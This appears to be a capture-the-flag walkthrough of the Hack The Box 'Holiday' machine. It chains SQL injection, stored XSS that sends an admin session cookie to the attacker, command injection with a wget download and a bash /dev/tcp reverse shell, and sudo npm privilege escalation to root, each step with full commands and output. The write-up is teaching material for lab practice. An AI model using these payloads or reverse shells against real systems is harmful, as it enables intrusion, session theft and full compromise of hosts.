<h2 id="overview-and-attack-chain">Overview &amp; Attack Chain</h2>
<p>Holiday is a classic "chained vulnerability" machine. There is no single magic bullet. Instead, you must exploit <strong>four distinct vulnerabilities in sequence</strong>:</p>
<ol>
<li><strong>User-Agent Filtering Bypass</strong> → Find hidden endpoints that standard tools miss.</li>
<li><strong>SQL Injection</strong> → Extract credentials from the login form.</li>
<li><strong>Stored Cross-Site Scripting (XSS)</strong> → Steal an administrator's session cookie.</li>
<li><strong>Command Injection</strong> → Execute arbitrary system commands as the web server user (<code>algernon</code>).</li>
<li><strong>Sudo Abuse (npm)</strong> → Escalate from <code>algernon</code> to <code>root</code>.</li>
</ol>
<p><strong>Hacker Mindset:</strong> <em>Hard boxes rarely give you a direct shell. Look for small cracks, exploit them to get a foothold, then use that foothold to find the next crack. Each exploit gives you access to something the previous one didn't.</em></p>
<hr />
<h2 id="step-1-reconnaissance-port-scanning">Step 1: Reconnaissance - Port Scanning</h2>
<h3 id="what-we-did">What We Did</h3>
<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.29.106
nmap -p 22,8000 -sC -sV -oA scans/nmap-tcpscripts 10.129.29.106
</code></pre>
<h3 id="baby-step-breakdown">Baby Step Breakdown</h3>
<p><strong>Why <code>nmap -p-</code>?</strong><br />By default, Nmap only scans the top 1000 ports. A hard box often runs services on non-standard ports. If we only scanned the top 1000, we might miss port 8000 (or a high port like 31337). The <code>-p-</code> flag tells Nmap to scan <strong>all 65,535 ports</strong>.</p>
<p><strong>Why <code>--min-rate 10000</code>?</strong><br />This tells Nmap to send at least 10,000 packets per second. Without this, scanning all ports can take 20-30 minutes. We speed it up because we are on a relatively stable network (Hack The Box VPN).</p>
<p><strong>Why <code>-sC</code> and <code>-sV</code> on the second scan?</strong><br /><code>-sC</code> runs Nmap's default script suite (like checking for SSH host keys, HTTP titles, etc.). <code>-sV</code> performs version detection. We only run these on the ports we already know are open (22 and 8000) because they are much slower than the initial port discovery.</p>
<h3 id="results">Results</h3>
<pre><code>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
8000/tcp open  http    Node.js Express framework
</code></pre>
<p><strong>What This Tells Us:</strong></p>
<ul>
<li>We have SSH access, but we don't have credentials yet. SSH on HTB Linux boxes is usually for the final shell or for tunneling, not the initial entry point.</li>
<li>Port 8000 is running a web application built on <strong>Node.js with Express</strong>. This is our attack surface.</li>
</ul>
<p><strong>Hacker Mindset:</strong> <em>When you see a web application, your brain should immediately think: "What endpoints exist? What forms are there? What headers does it care about?" Web apps are the most common entry point on HTB.</em></p>

<h2 id="step-2-web-enumeration-the-user-agent-trap">Step 2: Web Enumeration - The User-Agent Trap</h2>
<h3 id="what-we-did-2">What We Did</h3>
<p>We tried <code>gobuster</code> with a standard wordlist. It found <strong>nothing</strong>.</p>
<pre><code class="language-bash" data-language="bash">gobuster dir -u http://10.129.29.106:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
</code></pre>
<p>Then we tried <code>dirsearch</code> and it found <code>/login</code>, <code>/admin</code>, <code>/logout</code>, etc.:</p>
<pre><code class="language-bash" data-language="bash">dirsearch -u http://10.129.29.106:8000 --user-agent="Linux"
</code></pre>
<h3 id="baby-step-breakdown-2">Baby Step Breakdown</h3>
<p><strong>Why did Gobuster fail?</strong><br />The application has a <strong>User-Agent filter</strong>. If your tool sends a User-Agent like <code>gobuster/3.8.2</code>, the server returns <strong>404 Not Found</strong> for every endpoint—even if the page exists. <code>dirsearch</code> sends a realistic browser User-Agent by default (<code>Mozilla/5.0...</code>), so it saw the real pages.</p>
<p><strong>How did we figure this out?</strong><br />This is the critical hacker mindset: <strong>when two tools give different results, compare their requests.</strong> We could have used Burp Suite to intercept both requests and noticed the only major difference was the <code>User-Agent</code> header. By changing the User-Agent to <code>Linux</code>, <code>gobuster</code> also worked.</p>
<p><strong>Why does the filter exist?</strong><br />The developer probably wanted to block bots and crawlers. They assumed that only desktop and mobile browsers would have legitimate User-Agent strings. This is a form of <strong>security through obscurity</strong>—it doesn't actually fix any vulnerabilities, it just makes them slightly harder to find.</p>
<p><strong>The Code Behind It (from source analysis):</strong>
The app uses <code>express-useragent</code>. It checks <code>req.useragent.isDesktop || req.useragent.isMobile</code>. If neither is true, it returns 404. The library recognizes OS strings like <code>Linux</code>, <code>Windows</code>, <code>Mac</code>, <code>cros</code>, etc.</p>
<h3 id="commands-that-work">Commands That Work</h3>
<pre><code class="language-bash" data-language="bash"># Using dirsearch (has good default UA)
dirsearch -u http://10.129.29.106:8000 --user-agent="Linux"

# Using gobuster (must specify UA)
gobuster dir -u http://10.129.29.106:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --useragent "Linux"
</code></pre>
<h3 id="results-2">Results</h3>
<pre><code>/admin  -&gt; /login (302)
/login  (200)
/logout -&gt; /login (302)
/css, /js, /img (301)
</code></pre>
<p><strong>Hacker Mindset:</strong> <em>Never trust a single tool. If enumeration feels "empty," it's often not because the target is empty—it's because you're being filtered, rate-limited, or blocked. Always question your tools before questioning the target. Look at the raw HTTP requests and responses.</em></p>

<h2 id="step-3-sql-injection-breaking-the-login">Step 3: SQL Injection - Breaking the Login</h2>
<h3 id="what-we-did-3">What We Did</h3>
<p>We visited <code>/login</code> and saw a standard username/password form. We tested for SQL injection and found that the <strong>username</strong> field was vulnerable to injection using a <strong>double quote <code>"</code></strong>.</p>
<h3 id="baby-step-breakdown-3">Baby Step Breakdown</h3>
<p><strong>Step 3a: Testing for SQL Injection</strong>  </p>
<p>We started by sending single and double quotes to see if the application behaves differently:</p>
<pre><code class="language-bash" data-language="bash">curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
  -d 'username=%22' -d 'password=REDACTED | grep -i error
</code></pre>
<ul>
<li><code>'</code> (single quote) → "Invalid User"</li>
<li><code>"</code> (double quote) → "Error Occurred"</li>
</ul>
<p><strong>Why does this matter?</strong><br />The "Error Occurred" message is a <strong>database error</strong>. This tells us the backend tried to process our input as part of a SQL query and failed. The single quote didn't cause an error, meaning the query probably wraps the username in double quotes (or doesn't use quotes at all for that parameter).</p>
<p><strong>Hacker Mindset:</strong> <em>Always test with BOTH <code>'</code> and <code>"</code>. Developers often remember to sanitize one but forget the other. Error messages are your best friend—they tell you exactly what the database is thinking.</em></p>
<p><strong>Step 3b: Bypassing the Username Check</strong>  </p>
<p>We tried a classic OR-based bypass:</p>
<pre><code class="language-bash" data-language="bash">curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
  -d 'username=%22%20OR%20%221%22%3D%221' -d 'password=REDACTED
</code></pre>
<p>Decoded: <code>username=" OR "1"="1</code></p>
<p>Result: <strong>"Incorrect Password"</strong> — and the username field was prefilled with <strong><code>RickA</code></strong>.</p>
<p><strong>Why did this happen?</strong><br />The query structure is something like:</p>
<pre><code class="language-sql" data-language="sql">SELECT id, username, password, active 
FROM users 
WHERE (active=1 AND (username = "[INPUT]"))
</code></pre>
<p>Our input turned it into:</p>
<pre><code class="language-sql" data-language="sql">WHERE (active=1 AND (username = "" OR "1"="1"))
</code></pre>
<p>Since <code>"1"="1"</code> is always true, the <code>WHERE</code> clause returns the first active user in the table: <strong>RickA</strong>. The application then checked our password (which was wrong) and showed "Incorrect Password" with RickA's username prefilled.</p>
<p><strong>Hacker Mindset:</strong> <em>A "Incorrect Password" message after a bypass is often MORE valuable than a successful login. It confirms the user exists and gives you their username.</em></p>
<p><strong>Step 3c: UNION Injection to Extract Data</strong>  </p>
<p>Now we wanted to dump the database. We used <code>UNION SELECT</code> to add our own fake row to the result set. But a <code>UNION</code> requires the same number of columns as the original query.</p>
<p>We tested column counts:</p>
<pre><code class="language-sql" data-language="sql">")) UNION SELECT 1 -- -          → Error
")) UNION SELECT 1,2 -- -        → Error
")) UNION SELECT 1,2,3 -- -      → Error
")) UNION SELECT 1,2,3,4 -- -    → No error! Username field shows "2"
</code></pre>
<p><strong>Why 4 columns?</strong><br />The original query must be selecting 4 columns: probably <code>id, username, password, active</code> (which matches the table schema we later confirmed).</p>
<p><strong>Step 3d: Extracting Credentials</strong>  </p>
<p>We replaced the <code>2</code> with data we wanted:</p>
<pre><code class="language-bash" data-language="bash"># Dump username
curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
  -d 'username=%22%29%29%20UNION%20SELECT%201%2Cgroup_concat%28username%29%2C3%2C4%20FROM%20users--%20-' \
  -d 'password=REDACTED | grep -oP 'value="\K[^"]+'
# Result: RickA

# Dump password hash
curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
  -d 'username=%22%29%29%20UNION%20SELECT%201%2Cpassword%2C3%2C4%20FROM%20users--%20-' \
  -d 'password=REDACTED | grep -oP 'value="\K[^"]+'
# Result: [redacted retired-lab hash or flag]
</code></pre>
<p><strong>Cracking the Hash:</strong></p>
<pre><code class="language-bash" data-language="bash">echo -n "nevergonnagiveyouup" | md5sum
# Output: [redacted retired-lab hash or flag]
</code></pre>
<p><strong>Hacker Mindset:</strong> <em>32-character hex strings are almost always MD5. Before wasting time with Hashcat, try an online database or a quick <code>md5sum</code> of common passwords. This hash is a Rickroll reference—always try pop culture references on HTB boxes.</em></p>

<h2 id="step-4-stored-xss-stealing-the-admin-session">Step 4: Stored XSS - Stealing the Admin Session</h2>
<h3 id="what-we-did-4">What We Did</h3>
<p>We logged in as <code>RickA</code> and landed on <code>/agent</code> with a list of bookings. Clicking a booking showed a <strong>Notes</strong> tab. There was a message: <em>"All notes must be approved by an administrator."</em> We submitted a malicious note that executed JavaScript in the admin's browser, stealing their session cookie.</p>
<h3 id="baby-step-breakdown-4">Baby Step Breakdown</h3>
<p><strong>Step 4a: Recognizing the Vulnerability</strong>  </p>
<p>The phrase "must be approved by an administrator" is a <strong>massive red flag</strong>. It implies:</p>
<ol>
<li>There is an automated admin process (a bot).</li>
<li>The bot views the page containing our input.</li>
<li>If our input isn't properly sanitized, the bot will execute our code.</li>
</ol>
<p>This is a <strong>Stored XSS</strong> vulnerability. "Stored" means the payload is saved in the database (as a note) and executed later when someone (the admin bot) views it.</p>
<p><strong>Hacker Mindset:</strong> <em>Whenever you see "pending approval," "waiting for moderator," or "under review," immediately think XSS. The system is literally telling you that a higher-privilege entity will view your input.</em></p>
<p><strong>Step 4b: Testing the XSS Filter</strong>  </p>
<p>We first tested a simple image tag to confirm the bot makes external requests:</p>
<pre><code class="language-html" data-language="html">&lt;img src='http://10.10.16.84/test.jpg' /&gt;
</code></pre>
<p>Within a minute, we saw a hit on our Python web server from the target IP.</p>
<p>Then we tried a basic script:</p>
<pre><code class="language-html" data-language="html">&lt;script&gt;alert('XSS')&lt;/script&gt;
</code></pre>
<p>The result was mangled—the quotes were stripped, but the script tags survived partially.</p>
<p><strong>Why did some parts survive?</strong><br />The application uses a flawed XSS filter (<code>xss</code> npm package). The filter was configured with a <strong>whitelist</strong> allowing only <code>&lt;img src="..."&gt;</code>. For the <code>src</code> attribute, it removed spaces, single quotes, and double quotes. However, the filtering logic had a gap: it processed the <code>src</code> value but didn't completely neutralize script tags that were cleverly embedded inside.</p>
<p><strong>Step 4c: Filter Evasion with String.fromCharCode</strong>  </p>
<p>The filter removed quotes, so we couldn't write JavaScript like:</p>
<pre><code class="language-javascript" data-language="javascript">document.location='http://10.10.16.84/?c='+document.cookie
</code></pre>
<p>Instead, we encoded our entire payload as <strong>ASCII/Unicode character codes</strong> and used <code>String.fromCharCode()</code> to reconstruct it at runtime:</p>
<pre><code class="language-python" data-language="python">payload = """document.write('&lt;script src="http://10.10.16.84/x.js"&gt;&lt;/script&gt;')"""
nums = [str(ord(i)) for i in payload]
print('&lt;img src="x/&gt;&lt;script&gt;eval(String.fromCharCode('+','.join(nums)+'));&lt;/script&gt;"&gt;')
</code></pre>
<p><strong>Why does this work?</strong><br />The filter sees numbers and commas—completely harmless characters. It doesn't understand that <code>eval(String.fromCharCode(...))</code> will reconstruct dangerous strings at execution time. This is a classic <strong>filter evasion</strong> technique.</p>
<p><strong>The Final Payload:</strong></p>
<pre><code class="language-html" data-language="html">&lt;img src="x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,56,52,47,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;"&gt;
</code></pre>
<p><strong>Step 4d: The External JavaScript File (x.js)</strong>  </p>
<p>Why use an external file instead of putting everything in the payload?<br />Because the filter is unpredictable. By loading an external script, we have full control over the code that executes. The external script runs in the admin's browser with admin privileges.</p>
<p>We created <code>x.js</code>:</p>
<pre><code class="language-javascript" data-language="javascript">window.addEventListener('DOMContentLoaded', function(e) {
    window.location = "http://10.10.16.84:81/?cookie=REDACTEDcookie")[0].value)
})
</code></pre>
<p><strong>Why <code>document.getElementsByName("cookie")</code>?</strong><br />The application renders a hidden input on the booking page:</p>
<pre><code class="language-html" data-language="html">&lt;input type="hidden" name="cookie" value="connect.sid=..."&gt;
</code></pre>
<p>Our script reads this value and sends it to our listener.</p>
<p><strong>Step 4e: Setting Up Listeners</strong>  </p>
<p>Terminal 1 (serve the malicious JS):</p>
<pre><code class="language-bash" data-language="bash">sudo python3 -m http.server 80
</code></pre>
<p>Terminal 2 (catch the exfiltrated cookie):</p>
<pre><code class="language-bash" data-language="bash">nc -lnvp 81
</code></pre>
<p><strong>Step 4f: Submitting the Note</strong>  </p>
<ol>
<li>Log in to <code>http://10.129.29.106:8000/login</code> as <code>RickA</code> / <code>nevergonnagiveyouup</code>.</li>
<li>Click any booking.</li>
<li>Go to the <strong>Notes</strong> tab.</li>
<li>Paste the generated payload.</li>
<li>Submit and wait ~60 seconds.</li>
</ol>
<p><strong>Result:</strong></p>
<pre><code>GET /?cookie=REDACTED HTTP/1.1
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
</code></pre>
<p>The <code>User-Agent: PhantomJS/2.1.1</code> confirms the "administrator" is actually a <strong>headless browser bot</strong>.</p>
<p><strong>Hacker Mindset:</strong> <em>XSS is not just about popping alerts. It's about stealing sessions, performing actions on behalf of victims, and pivoting to higher privileges. Always think: "What does the victim have access to that I don't?" The admin had <code>/admin</code>. We wanted <code>/admin</code>.</em></p>

<h2 id="step-5-command-injection-from-admin-to-shell">Step 5: Command Injection - From Admin to Shell</h2>
<h3 id="what-we-did-5">What We Did</h3>
<p>We replaced our browser cookie with the stolen admin cookie and accessed <code>/admin</code>. There was an "Export" feature that downloaded data. The export endpoint was vulnerable to <strong>command injection</strong> via the <code>table</code> parameter.</p>
<h3 id="baby-step-breakdown-5">Baby Step Breakdown</h3>
<p><strong>Step 5a: Accessing the Admin Panel</strong>  </p>
<p>With the admin cookie, we visited <code>http://10.129.29.106:8000/admin</code>. We saw an "Export Bookings" and "Export Notes" button.</p>
<p><strong>Step 5b: Discovering Command Injection</strong>  </p>
<p>The export request looked like:</p>
<pre><code>GET /admin/export?table=bookings
</code></pre>
<p>We tried other known table names like <code>users</code> and it worked. But when we tried special characters, we got an error:</p>
<pre><code>Invalid table name - only characters in the range of [a-z0-9&amp;\s\/] are allowed
</code></pre>
<p><strong>Why is this interesting?</strong><br />The error message is overly specific. It tells us the <strong>exact regex</strong> used to filter input: <code>/[^a-z0-9&amp; \s\/]/g</code>. Most importantly, the <strong><code>&amp;</code> (ampersand)</strong> is allowed.</p>
<p><strong>Step 5c: Why &amp; Leads to Command Injection</strong>  </p>
<p>The backend code looks something like:</p>
<pre><code class="language-javascript" data-language="javascript">exec('sqlite3 hex.db SELECT\ *\ FROM\ ' + filteredTable, ...)
</code></pre>
<p>When we send <code>table=users&amp;id</code>, the shell sees:</p>
<pre><code class="language-bash" data-language="bash">sqlite3 hex.db SELECT * FROM users&amp;id
</code></pre>
<p>In bash, a single <code>&amp;</code> means: <strong>"Run the command before me in the background, then run the command after me."</strong> So <code>sqlite3 ...</code> runs in the background, and then <code>id</code> executes.</p>
<p>We verified this:</p>
<pre><code class="language-bash" data-language="bash">curl -s -A "Linux" \
  -b "connect.sid=s:d5615f50-5d19-11f1-9c8f-7de48e21f7db.pm+k81sZw90lV0029qnm1CbmRkbIR1zTWwPFCVvJOc4" \
  "http://10.129.29.106:8000/admin/export?table=x%26id"
</code></pre>
<p>Result: <code>uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)</code></p>
<p><strong>Hacker Mindset:</strong> <em>When you see an allowlist filter, look at what IS allowed, not just what's blocked. The developer allowed <code>&amp;</code> thinking it was harmless, but they forgot it has special meaning in bash. Always ask: "How does the backend use this input?" If it's passed to <code>exec()</code>, <code>system()</code>, <code>eval()</code>, or a shell command, special characters become dangerous.</em></p>
<p><strong>Step 5d: Getting a Reverse Shell</strong>  </p>
<p>We needed to get a proper interactive shell. The problem: most reverse shell payloads contain characters blocked by the filter (<code>;</code>, <code>|</code>, <code>&gt;</code>, <code>$</code>, <code>(</code>, <code>)</code>, etc.).</p>
<p><strong>The Solution:</strong> Write the complex payload to a file on Kali, download it with <code>wget</code> (which only uses allowed characters), then execute it with <code>bash</code> (also only allowed characters).</p>
<p><strong>The Decimal IP Trick:</strong><br /><code>wget</code> requires an IP address, but the <code>.</code> (dot) is <strong>blocked</strong> by the filter! However, Linux allows IP addresses to be written as integers.</p>
<p>Converting <code>10.10.16.84</code>:</p>
<pre><code>(10 * 256^3) + (10 * 256^2) + (16 * 256) + 84 = 168431700
</code></pre>
<p>So <code>wget 168431700/rs</code> is equivalent to <code>wget http://10.10.16.84/rs</code>.</p>
<p><strong>Preparing the payload file (<code>rs</code>):</strong></p>
<pre><code class="language-bash" data-language="bash">cat &gt; rs &lt;&lt; 'EOF'
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/10.10.16.84/9000 0&gt;&amp;1
EOF
</code></pre>
<p><strong>Why <code>/dev/tcp</code>?</strong><br />This is a bash feature that creates a TCP socket. It allows us to get a reverse shell without needing <code>nc</code>, <code>python</code>, or <code>perl</code> on the target. The payload is entirely self-contained in bash.</p>
<p><strong>Execution steps:</strong></p>
<ol>
<li>Start listener on Kali:</li>
</ol>
<pre><code class="language-bash" data-language="bash">nc -lnvp 9000
</code></pre>
<ol>
<li>Ensure your web server is running (serving <code>rs</code>):</li>
</ol>
<pre><code class="language-bash" data-language="bash">sudo python3 -m http.server 80
</code></pre>
<ol>
<li>Download the file to the target:</li>
</ol>
<pre><code class="language-bash" data-language="bash">curl -s -A "Linux" \
  -b "connect.sid=s:d5615f50-5d19-11f1-9c8f-7de48e21f7db.pm+k81sZw90lV0029qnm1CbmRkbIR1zTWwPFCVvJOc4" \
  "http://10.129.29.106:8000/admin/export?table=x%26wget+168431700/rs"
</code></pre>
<p>The command executed server-side becomes:</p>
<pre><code class="language-bash" data-language="bash">sqlite3 hex.db SELECT * FROM x &amp; wget 168431700/rs
</code></pre>
<ol>
<li>Execute the downloaded file:</li>
</ol>
<pre><code class="language-bash" data-language="bash">curl -s -A "Linux" \
  -b "connect.sid=s:d5615f50-5d19-11f1-9c8f-7de48e21f7db.pm+k81sZw90lV0029qnm1CbmRkbIR1zTWwPFCVvJOc4" \
  "http://10.129.29.106:8000/admin/export?table=x%26bash+rs"
</code></pre>
<p><strong>Result:</strong> We received a shell on <code>nc -lnvp 9000</code> as <code>algernon</code>.</p>
<pre><code>uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)
</code></pre>
<p><strong>Hacker Mindset:</strong> <em>When faced with a restrictive filter, break the problem into smaller pieces. You don't need to fit your entire reverse shell into one filtered parameter. Download a file first, then execute it. And always remember alternative IP representations—hexadecimal, decimal, octal. They bypass character filters on dots.</em></p>
<hr />
<h2 id="step-6-privilege-escalation-npm-install-as-root">Step 6: Privilege Escalation - npm install as Root</h2>
<h3 id="what-we-did-6">What We Did</h3>
<p>As <code>algernon</code>, we ran <code>sudo -l</code> and discovered we could run <code>npm i *</code> as root without a password. We created a malicious Node.js package with a <code>preinstall</code> script that spawned <code>/bin/bash</code>, installed it with <code>sudo</code>, and got root.</p>
<h3 id="baby-step-breakdown-6">Baby Step Breakdown</h3>
<p><strong>Step 6a: Always Check <code>sudo -l</code> First</strong>  </p>
<p>The very first thing you should do on any Linux box after getting a shell is:</p>
<pre><code class="language-bash" data-language="bash">sudo -l
</code></pre>
<p>This lists what commands the current user can run with elevated privileges.</p>
<p><strong>Result:</strong></p>
<pre><code>User algernon may run the following commands on holiday:
    (ALL) NOPASSWD: /usr/bin/npm i *
</code></pre>
<p><strong>Why is this dangerous?</strong><br /><code>npm i</code> (npm install) doesn't just copy files. It executes <strong>lifecycle scripts</strong> defined in the package's <code>package.json</code>. These scripts include:</p>
<ul>
<li><code>preinstall</code> — runs before installation</li>
<li><code>install</code> — runs during installation</li>
<li><code>postinstall</code> — runs after installation</li>
</ul>
<p>If <code>npm</code> runs as root, these scripts run as root.</p>
<p><strong>Hacker Mindset:</strong> <em>Sudo privileges on package managers (npm, pip, gem, apt, etc.) are almost always exploitable. Package managers are designed to execute arbitrary code during installation. If you can install as root, you own the box.</em></p>
<p><strong>Step 6b: Crafting the Malicious Package</strong>  </p>
<p>We created a minimal <code>package.json</code>:</p>
<pre><code class="language-json" data-language="json">{
  "name": "root_please",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "/bin/bash"
  }
}
</code></pre>
<p><strong>Why does this work?</strong><br />When npm installs this package, it sees the <code>preinstall</code> script and executes <code>/bin/bash</code> <strong>before</strong> copying any files. Since <code>sudo</code> invoked <code>npm</code>, the bash shell inherits root privileges.</p>
<p><strong>Why <code>--unsafe</code>?</strong><br />Running <code>npm</code> as root sometimes triggers safety warnings or permission checks. The <code>--unsafe</code> flag (or <code>--unsafe-perm</code>) tells npm to bypass these checks and run scripts anyway.</p>
<p><strong>Step 6c: Execution</strong>  </p>
<pre><code class="language-bash" data-language="bash">mkdir -p /dev/shm/privesc &amp;&amp; cd /dev/shm/privesc
cat &gt; package.json &lt;&lt; 'EOF'
{
  "name": "root_please",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "/bin/bash"
  }
}
EOF
sudo npm i /dev/shm/privesc --unsafe
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>&gt; root_please@1.0.0 preinstall /dev/shm/privesc
&gt; /bin/bash

id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p><strong>Step 6d: Capturing the Root Flag</strong>  </p>
<pre><code class="language-bash" data-language="bash">cat /root/root.txt
# 6ff878[redacted]cd5a68180
</code></pre>
<p><strong>Hacker Mindset:</strong> <em>Privilege escalation is often about abusing legitimate features, not exploiting memory corruption. <code>sudo npm i</code> is a feature that works exactly as designed—the design is just dangerous. Always look for "intended functionality" that has unintended security consequences.</em></p>
<hr />
<h2 id="key-takeaways-and-lessons-learned">Key Takeaways &amp; Lessons Learned</h2>
<h3 id="1-enumeration-depth-matters">1. Enumeration Depth Matters</h3>
<p>If <code>gobuster</code> returns nothing, it doesn't mean the site is empty. Headers, cookies, and User-Agents can completely change the application's behavior. Always inspect raw traffic.</p>
<h3 id="2-error-messages-are-information-leaks">2. Error Messages Are Information Leaks</h3>
<p>"Invalid User" vs "Error Occurred" vs "Incorrect Password" each tell you something different about the backend logic. Never ignore error messages.</p>
<h3 id="3-chained-exploits-are-common-on-hard-boxes">3. Chained Exploits Are Common on Hard Boxes</h3>
<p>You didn't get a shell from SQLi. You got credentials. From credentials, you got XSS. From XSS, you got an admin session. From admin session, you got command injection. From command injection, you got a shell. Each step required the previous one.</p>
<h3 id="4-filter-evasion-requires-creativity">4. Filter Evasion Requires Creativity</h3>
<p>When quotes are stripped, use <code>String.fromCharCode()</code>. When dots are blocked, use decimal IPs. When special characters are blocked in the command, download a file and execute it separately.</p>
<h3 id="5-package-manager-sudo-root">5. Package Manager Sudo = Root</h3>
<p><code>npm</code>, <code>pip</code>, <code>gem</code>, <code>apt</code>, <code>yum</code>—all of these execute code. If a user can run any of these with <code>sudo</code>, they can escalate to root by design.</p>
<h3 id="6-the-admin-bot-pattern">6. The Admin Bot Pattern</h3>
<p>Any feature mentioning "approval," "review," or "moderation" implies an automated user with higher privileges. That's your XSS target.</p>
